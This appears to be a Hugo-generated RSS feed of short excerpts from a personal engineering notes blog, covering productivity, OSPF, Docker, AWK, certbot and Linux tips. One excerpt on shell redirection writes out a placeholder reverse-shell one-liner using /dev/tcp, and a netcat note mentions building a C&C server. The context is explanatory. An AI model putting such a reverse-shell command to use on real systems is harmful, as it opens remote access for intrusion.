@@ -1,0 +1,218 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>string on Engineering Field Notes</title>
+    <link>https://kenmlai.me/tags/string/</link>
+    <description>Recent content in string on Engineering Field Notes</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Mon, 21 Oct 2019 00:00:00 +0000</lastBuildDate>
+    
+        <atom:link href="https://kenmlai.me/tags/string/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911221354/</link>
+      <pubDate>Fri, 22 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911221354/</guid>
+      <description>Good practices to keep being lucky scientifically People tend to name themselves and bad or good luck for their experience, but Luck is a final outcome of a person&amp;rsquo;s thoughts and behaviour in a subtle way. The thoughts and behaviour are rarely noticed so luck would be the only reason for what has happened.1
+For example, lucky people can spot more opportunities and are less tense than the unlucky ones, Unlucky people are usually too purpose centric thus don&amp;rsquo;t pay any attention to related things, this leads them missing possibilities.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911151310/</link>
+      <pubDate>Fri, 15 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911151310/</guid>
+      <description>Checklist for Projects  Human labor should ONLY involved in places for creativity. Any routines that are done manually should be automatically or ditched.  Style:
+ Standard style applied for the same type of code Code coverage should be &amp;gt;= 95%  Tests: [ ] Unit tests exist for all features of components [ ] Integration tests [ ] End to end tests [ ] Has Daily build [ ] The daily build is deployed in a test environment automatically daily</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911151418/</link>
+      <pubDate>Fri, 15 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911151418/</guid>
+      <description>OSPF Areas and Summarization may not be needed OSPF areas and summarization are two mechanisms designed to reduce routers&amp;rsquo; CPU and memory consumption, speed up the convergence and isolate impacts from changes.
+From their design purpose, some are not true at 2019:1
+  Reduce CPU and memory usage is mainly because both techniques result a smaller routing table. Unless the network is huge, this is not true. The CPU power and memory are significantly cheaper than both were designed, routers can easily handle a lot of routes now.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911141111/</link>
+      <pubDate>Thu, 14 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911141111/</guid>
+      <description>Nornir&amp;rsquo;s Speed for automation Ansible is a single-thread framework that each task can only run after its previous one. When automating a large scale network (&amp;gt;= 1000), it&amp;rsquo;s performance will become the main drawback.
+On the other hand, Nornir is implemented in multi-thread, the time-complexity is lower than Ansible predictably.
+Ref: [[Ansible vs. Nornir: Speed Challenge]]</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911141127/</link>
+      <pubDate>Thu, 14 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911141127/</guid>
+      <description>Ways&amp;rsquo; of Detecting Delusional Companies Here&amp;rsquo;s some ways of detecting delusional companies, especially startups.
+ Claim to make you rich. Playing blame game. The toxic aspect is either complaining about leadership or leadership blaming specific people and teams across the whole company. It&amp;rsquo;s a culture that throw each other under the bus, it doesn&amp;rsquo;t function well. Happy about the current state, stop seeking for better. Once you&amp;rsquo;re happy, you&amp;rsquo;re in a maintenance mode.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911141700/</link>
+      <pubDate>Thu, 14 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911141700/</guid>
+      <description>Ignore Hypes of Starting Companies There are a lot of stories about how well-known and successful CEOs started their companies in just an overnight and deadly simple reason. They are all hypes, untrue and delusional.
+As the example of Walmart1, basically none of the story is true for how the giant is so successful. Articles, stories, and videos are tend to make the truth more dramatical to allure eyeballs. This has NEVER been good for studying and learning from their experience.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911111516/</link>
+      <pubDate>Mon, 11 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911111516/</guid>
+      <description>Actions Reveal the Value There&amp;rsquo;s ONLY one criterion for valuing people&amp;rsquo;s true desires: What have they done or what are they doing.
+Ref: 1
+  [[Actions, not words, reveal our real values | Derek Sivers]] &amp;#x21a9;&amp;#xfe0e;
+   </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911111605/</link>
+      <pubDate>Mon, 11 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911111605/</guid>
+      <description>Tips for High Productivity The essence of high productivity is simply focusing on things with greatest impact and completing them, in another way, it&amp;rsquo;s all about putting time in the right places1. It comes down to how well I can manage the small choices every day1. Some tips for better productivity are: Remove the noise to improve focus 1.1 turn off notifications of computers and phones1 1.2 write everything down</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911111639/</link>
+      <pubDate>Mon, 11 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911111639/</guid>
+      <description>How to Improve Coding Skills  Code a lot. bring repetitive tasks into automation[[201911111605]], hobbies, and works etc. have focus on a few areas/languages learn the best practices and adhere to them ask questions look for cookbook/pocket references learn some computer science take some tutorials  Ref: 1
+  [[Code, Code, Code | PyDanny]] &amp;#x21a9;&amp;#xfe0e;
+   </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911102156/</link>
+      <pubDate>Sun, 10 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911102156/</guid>
+      <description>Key Points of Writing a Clear Note When writing a note, it&amp;rsquo;s critical to make it simple and clear, because a note can be interpreted differently in different context, and even can&amp;rsquo;t be understood if the original context loses. A note is more of a reflection, idea, thought and understanding instead of a prose, the key points in the note should be able to capture whenever it is read afterwards.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911081421/</link>
+      <pubDate>Fri, 08 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911081421/</guid>
+      <description>Git server and CICD Platform at home With more and more software development projects I&amp;rsquo;ve been working for the last several years, I have thought about several things which drive me moving git repositories from one to another.:
+ private repository support. Github didn&amp;rsquo;t support private repository for free tier users, I had to put those repositories in bitbucket and gitlab. CICD support. Services like Travis provide unlimited builds for public projects but require a lot for private repositories.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911081703/</link>
+      <pubDate>Fri, 08 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911081703/</guid>
+      <description>Fragile &amp;amp; Robust Nassim Taleb&amp;rsquo;s three-concept model includes:
+ Fragile, means something doesn&amp;rsquo;t tolerate variability. Robust, which is NOT the opposite of fragile in his model, means something that doesn&amp;rsquo;t change with variability Anti-fragile, the opposite of fragile in the context, means improvement with variability.  A system can be easily determined by bring new variables into it:
+ if the system&amp;rsquo;s performance, stability, reliability or etc. decreases, it&amp;rsquo;s fragile if the system remains the same, it&amp;rsquo;s robust if the system improves overall, it&amp;rsquo;s anti-fragile  Ref: 1</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911081833/</link>
+      <pubDate>Fri, 08 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911081833/</guid>
+      <description>Marking when Reading is rarely useful I used to mark &amp;amp; highlight a lot while reading with both physical and digital books. I once thought this was a very efficient way to help me to remember, understand, and then I can quickly pick them up whenever I want, digital marking is even more convenient by bringing in highlight management and search ability.
+All of my ideas were wrong!
+ Highlighting and marking don&amp;rsquo;t magically make me remember anything.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911051527/</link>
+      <pubDate>Tue, 05 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911051527/</guid>
+      <description>redirection in Linux Redirections in Linux can be interpreted as following:
+ Redirections are run from left to right. &amp;gt; is similar to =, which is an assignment &amp;amp; is close to $ in bash, which indicates variables  For the example in [[201911041338]],
+bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ip&amp;gt;&amp;lt;port&amp;gt; 0&amp;gt;&amp;amp;1  Here are three parts:
+ bash -i which is the command to launch new shell &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ip&amp;gt;&amp;lt;port&amp;gt;, which redirects the stdout of 1 to /dev/tcp/&amp;lt;ip&amp;gt;&amp;lt;port&amp;gt; as the stdin 0&amp;gt;&amp;amp;1 redirects the stdin as the stdout  The process steps are shown as following:</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911041311/</link>
+      <pubDate>Mon, 04 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911041311/</guid>
+      <description>About Productivity, Efficacy and Efficiency Nick stated productivity as &amp;ldquo;having a shippable product&amp;rdquo;, and efficacy as generating something &amp;ldquo;useful”1, which I interpret differently.
+I think Nick combine the definitions of productivity and effectiveness as a whole to illustrate his idea, but I&amp;rsquo;d like to keep them separate. Here&amp;rsquo;s the definitions for those three words:
+ Efficiency: How many things can be done in a period, which are not necessarily influential? Effectiveness: How influential a work can be (in the future)?</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911041338/</link>
+      <pubDate>Mon, 04 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911041338/</guid>
+      <description>netcat Tips nc 是Linux系统中非常强大的网络工具，可以轻松实现对主机的嗅探和简单但强大的C&amp;amp;C服务器 nc版本 nc有多个不同的版本： netc</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911031233/</link>
+      <pubDate>Sun, 03 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911031233/</guid>
+      <description>Let&amp;rsquo;s Encrypt with Gunicorn  Install certbot1  sudo apt-get install software-properties-common sudo add-apt-repository ppa:certbot/certbot sudo apt-get update sudo apt-get install certbot  There&amp;rsquo;s a notification while adding repository which shows the repository is for Debian, and needs your confirmation before adding it. We can follow the link in the notification to check it supports certain version of Ubuntu or not.
+generate keys by using dns challenging in manual mode. Gunicorn doesn&amp;rsquo;t support accessing a local file from web by redirecting a certain URL, so http, in default, challenge doesn&amp;rsquo;t work.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201911011038/</link>
+      <pubDate>Fri, 01 Nov 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201911011038/</guid>
+      <description>Systematic Study 系统性学习是能够客观上提高自身水平的唯一方式，所谓的系统性体现在理解相应领域的知识体系，并排除掉体系内的系列的知识盲点；而学习则不限于一</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201910311424/</link>
+      <pubDate>Thu, 31 Oct 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201910311424/</guid>
+      <description>AWK Tips awk is a line-based processing tool -F indicates separator of each column/field, which is space in default $0 means the entire row, $x means the xth column BEGIN{} 表示在处理数据之前的工作，可以用来打印表头 可以用3里面的表示来对每一列做逻辑判断</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://kenmlai.me/notes/201910311448/</link>
+      <pubDate>Thu, 31 Oct 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://kenmlai.me/notes/201910311448/</guid>
+      <description>Docker Tips Any edit in a Dockerfile will cause re-builds of consequential steps, so put lines that rarely changes in front Avoid using COPY . to copy a whole folder, only copy files are needed to avoid rebuild when any file changes in the folder Too many RUN commands increase layers. Try to combine set steps into one. Don&amp;rsquo;t install any development/debug tools/packages for production, only install everything that is</description>
+    </item>
+    
+  </channel>
+</rss>
